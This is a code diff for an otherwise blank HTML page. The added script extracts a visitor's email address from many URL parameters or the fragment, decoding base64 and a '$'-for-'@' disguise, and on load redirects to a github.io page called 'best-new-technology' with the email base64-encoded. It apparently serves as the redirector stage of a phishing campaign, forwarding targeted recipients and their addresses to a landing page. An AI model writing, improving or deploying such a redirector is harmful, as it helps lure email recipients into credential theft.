@@ -25,21 +25,153 @@
             return r;
         }
 
-        //var ramp = window.location.hash.substring(1);
-        var hash = window.location.hash.substring(1);
-        var email = decodeBase64(hash);
-        var email64 = decodeBase64(hash);
-        var email2 = email64.replace('$', '@');
-        var hash2 = btoa(email2);
-        console.log(email);
-        if (validateEmail(email2)) {
-            console.log(email);
-            window.location = "https://modified-technology.github.io/best-new-technology?email64=" + hash2;
+        // Function to check if a string is valid base64
+        function isBase64(str) {
+            try {
+                if (!str || typeof str !== 'string') return false;
+                
+                // Check if string contains only valid base64 characters
+                var base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;
+                if (!base64Pattern.test(str)) return false;
+                
+                // Try to decode it
+                decodeBase64(str);
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Function to get email from various URL sources
+        function getEmailFromURL() {
+            // Get URL parameters
+            var urlParams = new URLSearchParams(window.location.search);
+            
+            // FIRST: Check for email64 parameter (base64 encoded)
+            var email64Param = urlParams.get('email64');
+            if (email64Param && isBase64(email64Param)) {
+                try {
+                    var base64Decoded = decodeBase64(email64Param);
+                    if (validateEmail(base64Decoded)) {
+                        console.log("Found email64 parameter, decoded to:", base64Decoded);
+                        return base64Decoded;
+                    }
+                } catch (e) {
+                    console.log("Invalid base64 in email64 parameter:", email64Param);
+                }
+            }
+            
+            // SECOND: Check for other base64 parameters
+            var base64Params = ['e64', 'b64', 'base64', 'enc', 'encoded'];
+            for (var i = 0; i < base64Params.length; i++) {
+                var paramValue = urlParams.get(base64Params[i]);
+                if (paramValue && isBase64(paramValue)) {
+                    try {
+                        var decoded = decodeBase64(paramValue);
+                        if (validateEmail(decoded)) {
+                            console.log("Found base64 in parameter " + base64Params[i] + ", decoded to:", decoded);
+                            return decoded;
+                        }
+                    } catch (e) {
+                        // Not a valid base64 email
+                    }
+                }
+            }
+            
+            // THIRD: Check for plain email parameters
+            var emailParams = ['email', 'e', 'user', 'username', 'mail'];
+            for (var i = 0; i < emailParams.length; i++) {
+                var paramValue = urlParams.get(emailParams[i]);
+                if (paramValue && validateEmail(paramValue)) {
+                    console.log("Found email in parameter " + emailParams[i] + ":", paramValue);
+                    return paramValue;
+                }
+            }
+            
+            // FOURTH: Check URL hash/fragment
+            var hash = window.location.hash.substring(1);
+            if (hash) {
+                // Try to decode as base64 first
+                if (isBase64(hash)) {
+                    try {
+                        var base64Decoded = decodeBase64(hash);
+                        if (validateEmail(base64Decoded)) {
+                            console.log("Found base64 email in hash, decoded to:", base64Decoded);
+                            return base64Decoded;
+                        }
+                    } catch (e) {
+                        // Not a valid base64 string, continue to check as plain email
+                    }
+                }
+                
+                // Check if it's a plain email (replace $ with @ if needed)
+                var emailWithAt = hash.replace(/\$/g, '@');
+                if (validateEmail(emailWithAt)) {
+                    console.log("Found plain email in hash:", emailWithAt);
+                    return emailWithAt;
+                }
+                
+                // Check if hash contains base64 pattern
+                var base64Pattern = /([A-Za-z0-9+/]{20,}={0,2})/;
+                var base64Match = hash.match(base64Pattern);
+                if (base64Match && isBase64(base64Match[1])) {
+                    try {
+                        var base64Decoded = decodeBase64(base64Match[1]);
+                        if (validateEmail(base64Decoded)) {
+                            console.log("Found base64 pattern in hash, decoded to:", base64Decoded);
+                            return base64Decoded;
+                        }
+                    } catch (e) {
+                        // Not a valid base64 email
+                    }
+                }
+            }
+            
+            console.log("No valid email found in URL");
+            return null;
+        }
+
+        // Main execution
+        function processEmailAndRedirect() {
+            var email = getEmailFromURL();
+            
+            if (email) {
+                // Ensure @ symbol is correct (replace $ with @ if needed)
+                var cleanEmail = email.replace(/\$/g, '@');
+                
+                if (validateEmail(cleanEmail)) {
+                    console.log("Valid email found:", cleanEmail);
+                    
+                    // Encode email to base64 for the redirect
+                    // Using browser's built-in btoa for encoding
+                    var base64Email = btoa(cleanEmail);
+                    
+                    // Create the redirect URL with email64 parameter
+                    var redirectUrl = "https://modified-technology.github.io/best-new-technology?email64=" + encodeURIComponent(base64Email);
+                    
+                    console.log("Redirecting to:", redirectUrl);
+                    
+                    // Redirect to the target URL
+                    window.location = redirectUrl;
+                } else {
+                    console.log("Invalid email format:", cleanEmail);
+                }
+            } else {
+                console.log("No email found, cannot redirect");
+                // Optionally, you could redirect to a default page
+                // window.location = "https://modified-technology.github.io/best-new-technology/";
+            }
+        }
+
+        // Start the process when page loads
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', processEmailAndRedirect);
+        } else {
+            processEmailAndRedirect();
         }
     </script>
 </head>
 <body>
     <!-- Your HTML content goes here -->
 </body>
-
 </html>
